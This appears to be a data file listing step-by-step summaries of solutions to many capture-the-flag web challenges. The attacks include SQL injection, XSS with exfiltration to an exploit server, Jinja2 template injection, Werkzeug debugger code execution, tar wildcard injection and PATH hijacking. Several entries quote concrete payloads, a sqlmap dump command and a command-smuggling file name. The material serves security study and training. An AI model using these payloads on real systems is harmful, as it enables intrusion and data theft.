    "Knew that the flag was located in /var/www.",
    "Prepared an XML payload.",
    "Uploaded the XML payload.",
    "Used the 'view XML' tab on the web interface.",
    "Open the website.",
    "Examine the interface of the website.",
    "Find the URL of /robots.txt.",
    "Access the /robots.txt URL.",
    "Navigate to the disallowed path /ingen/",
    "Discover a text file named flag.txt",
    "Access the flag.txt file.",
    "Find the challenge flag.",
    "Inspect the Python file provided in the challenge.",
    "Note the inclusion of regex functionality.",
    "Analyze the Python code.",
    "Note that the code ignores the first letter if it's uppercase.",
    "Establish a pattern based on the previous observation.",
    "Use a debugging tool such as regex101.",
    "View code specifics using the debugging tool.",
    "Ensure understanding of the code.",
    "Consult the official Python documentation.",
    "Learn about special characters usable in regex from the documentation.",
    "Identify the '|' operator as potentially useful.",
    "Note that the '|' operator allows for matching of either of two separate regular expressions.",
    "Test the code with 'flag{randomString}'.",
    "Determine suitable regular expressions based on the test.",
    "Create a new regex matching the 'flag{randomString}' pattern.",
    "Use the '|' operator in the created regex.",
    "Replace the initial regex in the Python code.",
    "Use the newly created regex as the replacement.",
    "Obtain the flag.",
    "Visit the website.",
    "View the page source.",
    "Identify unique JavaScript with nextExport attribute.",
    "Identify unique JavaScript with autoExport attribute.",
    "Identify unique JavaScript with buildId attribute.",
    "Perform GET request to host https://space.sdc.tf with the endpoint /api/status.",
    "Receive a response indicating a healthy status and version.",
    "Notice three endpoints (/status, /rocketLaunch, /fuel) in the response.",
    "Request the /fuel endpoint.",
    "Attempt a simple GET request to /rocketLaunch.",
    "Leverage the assumption that a POST request might be needed.",
    "Send a POST request with 'launch' attribute set to true.",
    "Receive a missing rocket name error.",
    "Receive an error indicating 'triton' as an available rocket name.",
    "Receive an error for missing launch time.",
    "Receive an error message indicating pumpId was missing.",
    "Add a random pump ID from earlier /fuel endpoint response.",
    "Incorporate the token identified in the Javascript files into the POST request.",
    "Successfully complete the POST request with all required parameters.",
    "Capture the flag.",
    "Read and understand the hints provided in the challenge.",
    "Observe the response from the web application.",
    "Submit a blank value for the 'n' parameter in the web application.",
    "Observe the error response from the web application.",
    "Verify that the web application does not reject the submission of duplicate 'n' parameters.",
    "Locate the 'admin' page.",
    "Use the internetwache GitTools.",
    "Dump file contents of websites.",
    "Dump the '.git' directory.",
    "Use an extractor tool.",
    "Get files from the dump.",
    "Locate 2 'users.db' files.",
    "Confirm that both files are sqlite3 databases.",
    "Identify the database containing 'bcrypt' hashes.",
    "Identify the database containing 'md5' hashes.",
    "Crack the md5 hashes.",
    "Locate a valid credential.",
    "Use the located credential.",
    "Login on 'admin.html'.",
    "Acquire the flag upon login.",
    "Search the blog for log file links.",
    "Identify 3 log file links.",
    "Analyze the challenge description for hints.",
    "Infer the presence of additional log files.",
    "Examine the URLs of existing logs.",
    "Observe the discovery of over 1900 logs.",
    "Use curl to search for 'sdctf' in the logs.",
    "Fail to find 'sdctf' in the logs.",
    "Execute wget to download all available logs.",
    "Retrieve all logs for further analysis.",
    "Run grep command to search for unusual text.",
    "Identify leaks of bash history in the logs.",
    "Discover a command related to a netcat session.",
    "Identify the presence of a potential password.",
    "Logged in as dennisb@uupeye.edu",
    "Retrieved the link to the admin portal from student communication",
    "Tried to bruteforce the admin portal without success",
    "Used Burpsuite",
    "Payload used: admin@uupeye.edu' or '1'='1",
    "Successfully bypassed login and accessed the admin portal",
    "Accessed admin panel",
    "Intention to edit friend's grades specified over 4 semesters",
    "Inferred from the challenge that grades are uploaded through a json file",
    "Inspected page source",
    "Modified the given example json file",
    "Added more semesters to the json file",
    "Set the production value to true in the json file",
    "Used the following json to upload the updated grades",
    "Uploaded changes",
    "Received flag indicating successful completion of challenge",
    "Obtain the email of the target: alexo@uupeye.edu",
    "Identify that students may have weak passwords",
    "Find students' emails exposed at https://wpiadmin.wpictf.xyz/topStudents",
    "Compile a list of emails",
    "Start the brute forcing process",
    "Access all accounts with the obtained credentials",
    "Check the profile of each accessed account",
    "Find a flag in the profile of dennisb@uupeye.edu",
    "Define the URL of the website.",
    "Initialize an empty password string.",
    "Create an infinite loop.",
    "Loop through each character.",
    "Set the range of characters to loop through as '0123456789abcdef' (hexadecimal).",
    "Create a SQL Injection payload.",
    "Check the response for the text 'No such person'.",
    "If the text is found, the guess was incorrect.",
    "If the text is not found, the guess was correct.",
    "Output the password string and the trimmed section of the server response.",
    "Use a flag variable to denote a successful guess.",
    "If a guess was successful, restart the loop to guess the next character.",
    "If a guess was not successful, the full password has been guessed.",
    "Break the infinite loop.",
    "Exit the script.",
    "Visit the rule page.",
    "Read the page carefully.",
    "Keep reading until reaching the line at the bottom.",
    "Take note that the flag is represented as 'SharifCTF{MD5(lowercase(Hello_Rules))}'",
    "Open the command line tool.",
    "Open Python.",
    "Open Python.",
    "Encode the lowercase string into bytes.",
    "Use the 'md5' function to hash the bytes.",
    "Combine the hashed string with the text 'SharifCTF{' and '}' to form the flag.",
    "Investigate the HTML code of the website.",
    "Identify fields that need to be extracted.",
    "Create a function 'get_hidden' in the Python script.",
    "Take a URL as an argument.",
    "Send a GET request to the URL.",
    "Extract the response text (HTML).",
    "Create a function 'get_passwords' that generates all possible combinations of YYYYMM from the years 1900 to 2019 and months from 1 to 13.",
    "Log in to the website using the username 'jack' and the discovered password.",
    "Inspect the functionality of the website.",
    "Examine the URLs associated with different users and photos.",
    "Notice a 'session_id' stored in a cookie.",
    "Note that it is an MD5 hash.",
    "Recognize that the hash can be cracked.",
    "Change the hashed value to correspond to different usernames.",
    "Try to load a webpage associated with the 'admin' user.",
    "Discover the security question answer from one of the images.",
    "Use the discovered security question answer to bypass the security check and log in as the 'admin' user",
    "Check the source code of the website.",
    "Find CSP settings in the source code.",
    "Discover that the site restricts images to the same origin.",
    "Recognize the possibility of embedding any code into HTML using GET parameter.",
    "Confirm the existence of XSS vulnerability at a specific URL.",
    "Understand the purpose of the attack is to display an image only when the bot accesses the site.",
    "Identify that the cookie 'token' has the httpOnly attribute.",
    "Recognize that the httpOnly attribute prevents retrieval of the cookie by XSS.",
    "Discover plan of attack involving creating a new script tag.",
    "Convert flag images to base64 data.",
    "Send image data externally using the 'src' attribute of the generated script tag.",
    "Split the large image data into three parts.",
    "Split the data because it exceeded the length limit for the URL.",
    "Send the URLs to the bot.",
    "Send base64 encoded image data to the requestbin.",
    "Begin analysis of the verify() function.",
    "Identify verifyUsername() within the verify() function.",
    "Identify verifyPassword() within the verify() function.",
    "Identify verifyMFA() within the verify() function.",
    "Analyze verifyUsername() and find the simple string comparison indicating the correct username to be 'D0loresH4ze'.",
    "Investigate verifyPassword() and observe the use of bcrypt password verification.",
    "Refer to the PHP manual to obtain the bcrypt hash and identify the password as 'rasmuslerdorf'.",
    "Examine verifyMFA() and observe the check for a 10-digit random number.",
    "Utilize object injection to manipulate 'mfa' and '_correctValue' variables to be equal.",
    "Create the expected solution string using object injection.",
    "Add the encoded 'userdata' as a request parameter for the mfa service.",
    "Retrieve the flag as confirmation of successful authentication.",
    "Open the XML file",
    "Locate the flag component in the XML",
    "Modify the location of the flag component in the XML",
    "Identify a Server-Side Template Injection (SSTI) vulnerability in the password field within the code.",
    "Test the SSTI vulnerability by inputting a mathematical operation as the payload into the password field.",
    "Take note of the directory contents returned by the server.",
    "Identify an inaccessible server that is hosting data-server.",
    "Plan to send requests containing SQL to the server.",
    "Write a python script.",
    "Loop through a list of characters.",
    "Append each character to an initial flag string.",
    "Send the payload via POST request.",
    "Note that the server filters the character '.'.",
    "Note that the server does not have CURL.",
    "Use a python script to send requests.",
    "Perform code analysis",
    "Recognize user input concatenation in the SQL query",
    "Enter the crafted payload",
    "Execute the function",
    "Retrieve the output",
    "Capture the flag",
    "Identify a key called 'likeCookie' with a value of false.",
    "Change the value of 'likeCookie' to true.",
    "Write a Python script to automate the process.",
    "Send a GET request to the target URL with each possible 'likeCookie' value (from 0 to 19).",
    "Print out the corresponding 'likeCookie' value.",
    "Stop the loop.",
    "Execute the script to obtain the CTF flag.",
    "Analyzed the provided PHP code for the application's API request handling.",
    "Found that the user check 'is_admin()' would proceed to handle the 'c2' admin command parameter if true, otherwise would call 'redirect()'.",
    "Identified that 'redirect()' function did not actually terminate the script, but printed HTML output, allowing further code execution.",
    "Figured out the need of a passcode to perform admin functions.",
    "Discovered that '/lib/db/user.db' and '/lib/db/passcode.db' can be directly accessed from the server.",
    "Discovered that 'export_db' function could be exploited to read file contents if the passcode was correct.",
    "Finally, found the flag 'ACSC{it_is_hard_to_name_a_flag...isn't_it?}'.",
    "Identify a 'genflag' server.",
    "Recognize that 'mobile-viewer' couldn't directly interact with server.",
    "Notice server-rendered pages.",
    "Recognize them as screenshots.",
    "Identify 'website' as the same site for the request.",
    "Discover that 'website' runs 'yarn dev'.",
    "Realize 'yarn dev' runs 'vitepress dev src'.",
    "Identify Vitepress is in dev mode.",
    "Recognize that it opens up path traversal vulnerabilities.",
    "Create a CSRF request.",
    "Use btoa javascript function.",
    "Retrieve the received private key.",
    "Use it to SSH onto the target server.",
    "Obtain the flag from within the target server.",
    "Identified the '/usr/games/cowsay' game",
    "Identified that the game is operated from 'child_process.spawnSync'",
    "Observed the settings endpoint",
    "Identified 'ctx.state.user' as the target of the settings",
    "Realized that the setting name is user-controlled",
    "Realized the potential for prototype pollution",
    "Executed a HTTP POST request",
    "Set the settings",
    "Set 'shell=true' for all objects",
    "Command injection became possible",
    "Executed a HTTP GET request",
    "Successfully retrieved the Flag",
    "Identify that the server uses dynamic rendering.",
    "Understand that dynamic rendering renders JavaScript on the server-side before serving web crawlers.",
    "Check the Nginx configuration.",
    "Observe the rewriting and forwarding of the request to the pre-renderer at `http://renderer:3000`.",
    "Detect the usage of Prerender to handle the requests.",
    "Set the host header.",
    "Ensure that the renderer visits our attacker-controlled site.",
    "Perform XSS attack.",
    "Create a `redirect.php` file.",
    "Ensure that visiting `redirect.php` redirects the renderer's browser to the second exploit page.",
    "Construct `exploit.html` file.",
    "Bypass SOP.",
    "Exploit the fact that the current site and the iframe's source are both `http://localhost:3000`.",
    "Receive the contents of the iframe.",
    "Decode the received Base64 string.",
    "Review the problem statement.",
    "Realize that 'jsonwebtoken' 3.2.2 has a known authentication bypass vulnerability.",
    "Examine the application's server code.",
    "Understand that the JWT token is essentially encoded JSON data.",
    "Understand that the JWT token is signed and verified on the server-side.",
    "Notice that the public key used for the JWT token handling is stored in the '__dirname' directory.",
    "Discover that the server generates a JWT token.",
    "Discover that the 'language' field is set according to the parameter passed via the POST handler for '/localization-language'.",
    "Realize that the GET handler for '/localisation-file' allows the reading of arbitrary files.",
    "Understand the constraints of the language input.",
    "Understand that the constraints are due to a regex check.",
    "Test the theory.",
    "Set the 'language' parameter to 'key' in the JWT token.",
    "Retrieve the key file.",
    "Sign the token using the retrieved public key.",
    "Create a script to generate the JWT payload.",
    "Sign the token using the public key.",
    "Verify that the token is successfully signed.",
    "Use the server's own mechanism against it.",
    "Set the 'lion-token' cookie to the generated token.",
    "Read the challenge description thoroughly",
    "Inspect the provided Nginx configuration for any vulnerabilities",
    "Identify the '/admin' directive in the Nginx configuration that denies all requests",
    "Discover a hidden endpoint '/admin/key' from the server code",
    "Realize that the access to '/admin/key' is needed to get the key",
    "Identify another part of the Nginx configuration that preserves request headers when requests are forwarded to Gunicorn",
    "Research on whether the HTTP headers can manipulate the processing of URL path by Gunicorn",
    "Find out that the 'SCRIPT_NAME' WSGI variable can strip its prefix from 'PATH_INFO'",
    "Realize that the decryption key can be obtained by supplying a 'key_id' in the HTTP headers",
    "Use the site's JavaScript to generate the 'key_id'",
    "Find out the decryption key by using the 'key_id'",
    "Modify the '/decrypt' endpoint to decrypt the file using the found decryption key",
    "Find out the flag",
    "Identify a Flask webpage",
    "Note the presence of certain blacklisted words as restriction",
    "Recognize the usage of GET request arguments",
    "Use `attr()` Jinja2 filter to pass blacklisted characters",
    "Apply `attr()` filter with payload `/submit?value={{()|attr(request.args.c)}}&c=__class__`",
    "Evaluate the object attribute and display it to the user",
    "Use the method `().__class__.__base__.__subclasses__()`",
    "Retrieve subclasses of the base class",
    "Formulate a GET request",
    "Copy the output",
    "Access the index 258",
    "Leverage `subprocess.Popen` for Remote Code Execution (RCE)",
    "Construct another GET request",
    "Read the flag file",
    "Submit an authentication request with a username.",
    "Fail the authentication.",
    "Observe that the username is reflected back into the username field.",
    "Fuzz the username input with various inputs.",
    "Observe that anything after a whitespace is removed.",
    "Verify that the replacement is non-recursive.",
    "Analyze the resulting SQL query.",
    "Perform the necessary action to retrieve the flag.",
    "Access the front-end JavaScript source code.",
    "Inspect the front-end JavaScript source code.",
    "Identify that data is being fetched from a MongoDB backend.",
    "Discover the exposed Meteor methods.",
    "Observe the 'notes.count' function.",
    "Understand the purpose of 'notes.count'.",
    "Use Burp Suite.",
    "Deduce the purpose of the '$ne' filter.",
    "Understand the purpose of '$regex'.",
    "Understand that '$regex' allows regex patterns for note contents.",
    "Check for notes that match the regex pattern 'flag{.*}'.",
    "Use the technique to bruteforce every character of the flag.",
    "Concatenate possible characters to the end of the flag.",
    "For each possible character.",
    "Output the character if it returns a count larger than 0.",
    "Repeat the process until the entire flag ('flag{4lly0Urb4s3}') is discovered.",
    "Analyze the code.",
    "Understand the behavior of the code.",
    "Identify potential vulnerabilities.",
    "Determine the code checks file extensions for uploaded files.",
    "Identify the allowed file extensions: 'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx'.",
    "Recognize the purpose of normalization: prevent directory traversal attacks.",
    "Discover the use of the 'os.system()' method.",
    "Identify use of the 'tar' command when downloading files.",
    "Recognize potential wildcard injection vulnerability.",
    "Understand Wildcard Injection.",
    "Recognize how Wildcard Injection can be abused for command injection attacks.",
    "Identify manipulation of wildcards in system commands as the attack method.",
    "Identify the vulnerability lies in the use of tar utility.",
    "Understand that the program is executed when 10 records are reached by default.",
    "Conceptualize the attack.",
    "Recognize that '--checkpoint=1' does not pass the file extension check.",
    "Uncover the checkpoint creation by tar utility.",
    "Understand that each record consists of 20 blocks of 512 bytes each.",
    "Devise the exploit.",
    "Initialize a GET request.",
    "Target the URL for the GET request.",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Send POST request to upload the 'shell.txt' file.",
    "Send POST request to upload the '--checkpoint-action=exec=sh shell.txt' file.",
    "Start a loop.",
    "Create a tar archive with all the uploaded files.",
    "Check if the combined size of uploaded files exceeds the size of 10 tar records.",
    "Visit lukas-app.de.",
    "Observe that it's a static site.",
    "Determine that there's not much to exploit.",
    "Perform a certificate search using crt.sh.",
    "Identify two additional subdomains through the certificate search.",
    "Notice a redirect to a different domain when fetching an image.",
    "Final server returns Server: Apache/2.4.50 (Unix).",
    "Determine that Server: Apache/2.4.50 (Unix) is known to be vulnerable to a recent path traversal vulnerability.",
    "Attempt to exploit the vulnerability using standard payload.",
    "URL-encode the payload again.",
    "Adjust exploit path based on Twitter inspiration from similar challenges.",
    "Successfully exploit the path traversal vulnerability using a triple URL-encoded payload.",
    "Read the Apache configuration file.",
    "Read the Python source code for the web app.",
    "Find faulty secret key handling in the Python source code.",
    "Change session username to 'root' using client-side cookies.",
    "Sign the Flask cookie with the desired username to authenticate as 'root'",
    "Visit the website with the updated cookies.",
    "Retrieve the flag.",
    "App was composed of frontend and payment backend.",
    "Separate user accounts were used.",
    "Messages were signed using ED25519.",
    "Signing was done to prevent tampering.",
    "Checked that balance never went below 0.",
    "Users were redirected to '/callback' on the frontend application.",
    "Messages and signatures were verified by the frontend.",
    "GET query parameters were added to the messages before verification.",
    "'request.args.get('amount')' was added to the user balance.",
    "Created new user with username 'FRONTEND_USERNAMEamount1337' to manipulate the message format.",
    "Server was able to provide signature for this manipulated message.",
    "Performed parameter pollution on the frontend with 'GET /callback?user=FRONTEND_USERNAME&amount=1337&amount=0&nonce=NONCE&sig=SIGNATURE'",
    "Due to frontend processing, this resulted in the same verified message but carrying a different meaning.",
    "Successfully added 1337 coins to the account.",
    "Signed up on the website.",
    "Viewed the invoice URL in the format '/legacy_invoice_system/BASE64_ENCODED_STRING'.",
    "Decoded the base64-encoded string.",
    "Caused an SQL error.",
    "Collected from the error message.",
    "Created a custom SQLMap tamper script.",
    "Dumped the database.",
    "Located the flag.",
    "Flag was located within the public news_article table of the database dump.",
    "Used SQL injection payload `1' or '1'='1`.",
    "Deduced the number of columns based on error return.",
    "Realized stacked queries were allowed.",
    "Used `1'; SHOW DATABASES;`.",
    "Used `1'; SHOW TABLES;`.",
    "Used `1'; USE information_schema; SHOW TABLES;`.",
    "Attempted to uncover stored procedures and functions using `1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`.",
    "Levied MariaDB's support for the 'EXECUTE IMMEDIATE' command to run queries as strings.",
    "Used backticks around the numeric table name.",
    "Identified that the binary calls the 'id' command three times, with privileges",
    "Identified that the binary calls the 'id' command three times, without privileges",
    "Recognized the need to manipulate the PATH variable due to the SUID flag being set",
    "The bash script would only spawn the shell if the caller is root",
    "Went to the '/tmp' directory",
    "Set permissions of the 'id' file to 777",
    "Exported '/tmp' to the PATH",
    "Ensured the shell would execute the malicious 'id'",
    "Confirmed the malicious 'id' could be run as root",
    "Successfully got the challenge flag",
    "Perform a directory scan.",
    "Identify available endpoints.",
    "Attempt command injection.",
    "Execute 'cat cmd.php' command.",
    "View the code of 'cmd.php'.",
    "Observe the presence of the blacklist filter in the code.",
    "Examine the blacklist filter code.",
    "Understand it as a potential workaround for the blacklist.",
    "Ensure the payload bypasses the blacklist.",
    "Construct a command.",
    "Output the constructed command.",
    "Verify the formatting of the command.",
    "Validate the content of the command.",
    "Observe the vulnerability in the incoming responses at the '/checkbalance' endpoint.",
    "Notice that users are redirected.",
    "Observe redirection when the queried amount exceeds the user's actual balance.",
    "Determine that window's history length can reveal whether a redirection occurred.",
    "Understand that the history length can be used to approximate the user's balance.",
    "Open a new window from the exploit server.",
    "Wait for the site to load.",
    "Observe the possibility of redirection to '/' depending on the user's balance.",
    "Change the window's location back to the exploit server.",
    "Check the window's 'history.length' attribute.",
    "Analyze the 'history.length' attribute to determine if a redirect occurred.",
    "Use trial and error to narrow down the appropriate number.",
    "Control the number of intervals in the aforementioned steps to aid in the narrowing down process.",
    "Build a HTML page to automate this process.",
    "Navigate to the '/checkbalance' endpoint with the queried amount.",
    "Register a delay for the page to load.",
    "Change the location of the pop-up back to the exploit server.",
    "Check the length of the window's history.",
    "Analyze the window's history length to determine if a redirection has occurred.",
    "Check if the history length is three.",
    "Return false and the queried amount.",
    "If the history length is not three, the balance is exceeded.",
    "Return that the balance is exceeded and the queried amount.",
    "Start the checker.",
    "Post each successful guess to the exploit server.",
    "Understood the presence of a blacklist filter for '#' symbol",
    "Understood the presence of a blacklist filter for '=' symbol",
    "Discovered that using 'test' or 1-- - can obtain possible account credentials",
    "Verified that the obtained credentials do not provide the flag",
    "Scheduled to perform a UNION based injection",
    "Received a collection of CSV files containing network traffic data",
    "Received a shapefile with information about cameras in Singapore",
    "Instructed to locate the origin point of most attacks",
    "Discovered the latitude and longitude of the most frequently occurring src_ip",
    "Parsed the shapefile using geopandas",
    "Implemented haversine formula",
    "Used the formula to calculate the great-circle distance between locations",
    "Established the coordinates of the point of interest",
    "Looped through each camera location in the shapefile",
    "Checked if each camera location is within the specified distance from the point of interest",
    "Counted the number of cameras within the specified distance using the haversine formula",
    "Received a Markdown Editor web application to host notes for a challenge",
    "Admin bot visits URL submissions",
    "Started analysing how the web application processes Markdown",
    "Found that the preview feature is an iframe",
    "Preview button posts a message to the iframe",
    "Iframe's message is received and processed in /demo",
    "Iframe posts the response from the /api/filter endpoint to window.parent",
    "Any site can create an iframe of the web application and receive the message",
    "Server code for /api/filter endpoint returns the hash of the user's token in the response",
    "Payload loads /demo in an iframe",
    "Payload posts a message to trigger the /api/filter POST request in the admin's context",
    "Received the admin's hash on the exploit server",
    "Admin's token access is required to access the flag",
    "XSS payload is generated by sending a POST request to /api/create",
    "CSRF payload is created",
    "CSRF payload fetches /api/flag",
    "CSRF payload makes a callback to the exploit server with the page contents",
    "Received the /api/flag contents",
    "URL-decoded the output",
    "Obtained the flag",
    "Identify the website's vulnerability to XSS.",
    "Examine the init() function of the website.",
    "Identify that the init() function changes the displayed note's innerHTML to the /get response on load.",
    "Discover that the user can add notes.",
    "Examine the /get endpoint.",
    "Examine the /add endpoint.",
    "Recognize the XSS prevention methods implemented by the site.",
    "Identify that cookies are set to prevent XSS for all API endpoints.",
    "Realize that although XSS can be performed, it would only affect the currently logged in user and not the admin.",
    "Examine the /find endpoint.",
    "Discover that the /find endpoint can be used for Response Header Injection.",
    "Preserve the original admin's ID.",
    "Set the Path of the custom cookie to /get.",
    "Create a XSS payload.",
    "Use the /find endpoint.",
    "Create a Python script.",
    "Modify the output of the Python code.",
    "Format the output of the Python code to look like a JavaScript script.",
    "In the script, manipulate the multiple URL opens.",
    "Replace the multiple URL opens with actual browser window opens.",
    "Redirect the user to the main site.",
    "The exploitative script is run in the background.",
    "Perform a CSRF to the /find endpoint.",
    "Extract the flag from the response received on the callback URL.",
    "Identify a URL for the server to request.",
    "Verify the server code location from the provided Dockerfile as '/code/app.py'.",
    "Review the server code.",
    "Recognize that a Redis database was being utilized.",
    "Understand that a 'Requests_On_Steroids' function is used for POST request.",
    "Fetch the URL using the 'Requests_On_Steroids' function.",
    "Show the flag in the response.",
    "Observe that 'Requests_On_Steroids' function in 'main.py' supports Gopher protocol.",
    "Communicate with any TCP server using Gopher protocol.",
    "Discover that instead of 'gopher://' protocol, 'inctf://' should be used.",
    "Identify the 'GopherAdapter' code in 'modules/Gophers.py'.",
    "Find that the Gopher adapter used was modified from a GitHub gist.",
    "Realize the inability to send multi-line input using RESP protocol.",
    "Recognize that 'urllib.parse' was updated to strip newline characters.",
    "Use inline commands of Redis to send commands directly.",
    "Send the command 'SET <userID>_isAdmin \"yes\"'.",
    "Set the <userID>_isAdmin value to 'yes'.",
    "Receive the flag 'inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}'.",
    "Identify the target page '/post.php'.",
    "Send the crafted request to confirm the presence of the vulnerability.",
    "Make a decision to achieve remote code execution.",
    "Recognize the requirement of having write access to a file on the server.",
    "Discover the PHP sessions are file-based.",
    "Identify the predictable storage location of PHP sessions as '/tmp/sess_<PHPSESSID>'.",
    "Recognize the existence of '/set.php' page.",
    "Understand the possibility of accessing the session file through the LFI vulnerability.",
    "Recognize that the set input reflects in the included PHP code.",
    "Send the crafted request to confirm the vulnerability and the input reflection.",
    "Search for a PHP payload that creates a web shell.",
    "Craft a request to set the theme to the PHP payload.",
    "Utilize the web shell to gain access to the file system.",
    "Given login credentials for an online portal with MFA and Captcha code protection.",
    "Notice a 'login_session_token' is received upon login attempt.",
    "Identify that the 'login_session_token' is used when making a query to 'mfa_service.php'.",
    "Discover that there is no limit to the number of attempts made with the same token, as long as correct CAPTCHA code is provided.",
    "Perform batching in GraphQL to send multiple queries at once, with the anticipation that the server will process all queries together using the same CAPTCHA code.",
    "Successfully use the same CAPTCHA code to test two different MFA tokens by sending them both in the same HTTP request.",
    "Understand that MFA token is only 4 digits and take advantage of this limited search space by sending batches of thousands of queries together, thereby reducing the number of required CAPTCHA responses.",
    "Observe that due to request length limits around 3000 queries are batched at a time.",
    "Write script to automate this process of generating payloads and making POST requests.",
    "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
    "Found a successful login attempt among the batched requests.",
    "Obtained the flag `MetaCTF{if_brute_force_doesnt_work_use_more_brute_forceeeeeeee}`.",
    "Analyzed the initial JavaScript code.",
    "Recognized the platform as SQLite database.",
    "Retrieved table names.",
    "Identified the additional table holding the flag.",
    "Ran a final UNION query.",
    "Retrieved the flag.",
    "Initiated a network scan using Nmap",
    "Performed a port scan and identified Apache server version 2.4.49 operating on port 12380",
    "Conducted research and determined that Apache server version 2.4.49 has a known vulnerability",
    "Visited the vulnerability database at https://www.exploit-db.com/exploits/50383",
    "Exploited the Remote Code Execution (RCE) vulnerability to gain unauthorized access to the system",
    "Crafted a malicious HTTP GET request to exploit the identified vulnerability",
    "Encoded the contents of the retrieved file in base64 format for smooth transfer without encoding issues",
    "Identified 'Server' response header.",
    "Identified vulnerability CVE-2018-8004.",
    "Observed the server using 'Content-Length' header.",
    "Noticed that the server uses 'Content-Length' header even if 'Transfer-Encoding' header exists.",
    "Observed a request to '/save.php'.",
    "Noted the appending of an entry to a log file.",
    "Observed the entry in the log file containing the cookies and value of 'X-Access' header.",
    "Assumed an admin visit to the site.",
    "Directed the admin to '/save.php'.",
    "Crafted a payload using 'GET / HTTP/1.1'.",
    "Realized the ATS server forwards the payload as a single request to the Nginx backend.",
    "Noted the existence of the second request 'GET /save.php HTTP/1.1'.",
    "Recognized that the second request is not yet completed after the end of the first request.",
    "Identified the admin's visit as a third request.",
    "Recognized that the admin's request is appended to the incomplete second request.",
    "Noted that the appended requests are processed as one single request.",
    "Recognized the presence of admin's 'Cookie' and 'X-Access' headers.",
    "Viewed the admin's cookie and 'X-Access' headers.",
    "Used the admin's cookies to visit 'private.php'.",
    "Obtained the flag from 'private.php'.",
    "Registration process was completed in the system.",
    "Observed redirection to `/users/<username>/files` after registration.",
    "Utilized two accounts for user enumeration.",
    "Successfully established the ability to enumerate usernames at `/users/<username>`.",
    "Received 404 Not Found error upon a failed enumeration.",
    "Discovered valid usernames including `admin`, `root`, `builder`, `employee`, and `staff`.",
    "Observed server side validation for valid user during file retrieval at `/users/<username>/files/<filename>`.",
    "Identified an Insecure Direct Object Reference (IDOR) vulnerability due to the absence of ownership verification during file requests.",
    "Scanned each discovered username for potential files associated with them.",
    "Located the flag at `/users/employee/files/fileadmin`.",
    "Log into the application",
    "View the page source",
    "Identify the 'role' attribute",
    "Determine the potential for privilege escalation",
    "Examine the registration fields",
    "Understand the submitted data during registration",
    "Identify the 'account' object",
    "Identify the 'username' and 'password' attributes",
    "Submit the registration form",
    "Escalate privileges",
    "Access the '/admin' page",
    "Verify that the role was changed to 'admin'",
    "Identify the application listening on port 11111.",
    "Determine that the identified application is a web application.",
    "Assess the web application.",
    "Execute the SQL injection payload.",
    "Identify the challenge.",
    "Recognize the challenge.",
    "Note the challenge is related to cookie manipulation.",
    "Notice the cookies.",
    "Observe cookies being set at every stage of authentication.",
    "Recognize the necessity.",
    "Note certain cookies are required.",
    "Understand the goal is to gain access to '/admin'.",
    "Inject another cookie.",
    "Name the cookie 'visited-main-page'.",
    "Assign the value 'true' to the cookie.",
    "Inject a further cookie.",
    "Name the cookie 'made-an-account'.",
    "Assign the value 'true' to the cookie.",
    "Inject another cookie.",
    "Access '/admin'.",
    "Analyzed the provided PHP source code.",
    "Identified vulnerabilities in the PHP source code.",
    "Noted that most common PHP file extensions are blocked.",
    "Observed that .htaccess extension is allowed.",
    "Created a .htaccess file.",
    "Modified .htaccess to interpret .php16 as PHP.",
    "Uploaded the .htaccess file.",
    "Created a .php16 file.",
    "Used the remote code execution.",
    "Downloaded the flag.",
    "Identify the challenge as a Server Side Request Forgery (SSRF) issue.",
    "Determine the vulnerable parameter as 'galleryUrl'.",
    "Decide to exploit the SSRF vulnerability.",
    "Specify the '/admin' path as the target.",
    "Craft the malicious query.",
    "Analyze the source codes provided.",
    "Understand the requirements to pass the login authentication that includes correct username, password, and a Multi-factor Authentication (MFA) token.",
    "Identify the hardcoded username.",
    "Confirm the password from a known resource.",
    "Identify PHP object injection vulnerability through unserialize() function.",
    "Realize that initialization of the 'mfa' attribute as a reference to the '_correctValue' attribute allows to bypass the MFA check.",
    "Verify the user data.",
    "Find a HTTP service.",
    "Identify the service.",
    "Verify that the service is the app mentioned in the challenge.",
    "Test the app.",
    "Determine the IP address in the URL.",
    "Conduct a Burp intruder scan.",
    "Scan 10.35.2.134/call_api.php.",
    "Identify potentially connectable hosts.",
    "Scan the 10.0.42.0/24 network.",
    "Discover valid endpoints at 10.0.42.2 and 10.0.42.200.",
    "Identify the GET form with 'search' parameter in 10.0.42.200.",
    "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
    "Run SQLMap command 'sqlmap http://127.0.0.1/test.php?search=abc -p search --tamper=space2comment --technique=B --risk 3 --dump --threads 10 -D db -T internal_api_infos' to inject and dump database data.",
    "Use the dumped admin credentials to login to the first webpage.",
    "Use the remaining dumped credentials to login to the Admin page and access the flag.",
    "Check the cookies.",
    "Understand that the API is powered by Werkzeug.",
    "Recognize that Werkzeug includes a debugging console at '/console' when debugging is enabled.",
    "Make the inference that if debugging is enabled, it would likely be on the development server.",
    "Infer that debugging on the production server is unlikely.",
    "Visit the URL `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole`.",
    "Search for a Werkzeug console.",
    "Find the secret key for the debugger.",
    "Identify that the secret key is hardcoded in the JavaScript.",
    "Craft a request with the following parameters: `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole?__debugger__=yes&cmd=__import__('os').listdir('/')%3b&frm=0&s=IUrsy36AKlZ2zvT1vaPc`.",
    "Initiate Remote Code Execution (RCE) through the crafted request.",
    "Search for `flag.txt` in the root directory.",
    "Send a request to read the content of the `flag.txt` file.",
    "Identify the problem that requires generating two PDFs.",
    "Use Python scripting to manipulate the PDF files.",
    "Use the 'mutool' command to manipulate the PDF files.",
    "Create 'first.pdf' using the chosen input PDF.",
    "Create 'second.pdf' using the chosen input PDF.",
    "Create 'merged.pdf' containing a dummy PDF.",
    "Include the chosen input PDFs in the 'merged.pdf'.",
    "Read and store the content of the merged PDF file.",
    "Read and store the content of the initial PDF files.",
    "Extract the count of PDF pages from the merged PDF file.",
    "Extract the count of PDF pages from the initial PDF files.",
    "Identify the list of references to the PDF pages in the merged PDF file.",
    "Exclude the reference to the dummy page from the list of PDF pages.",
    "Create a separate PDF page list for the first input PDF.",
    "Create a separate PDF page list for the second input PDF.",
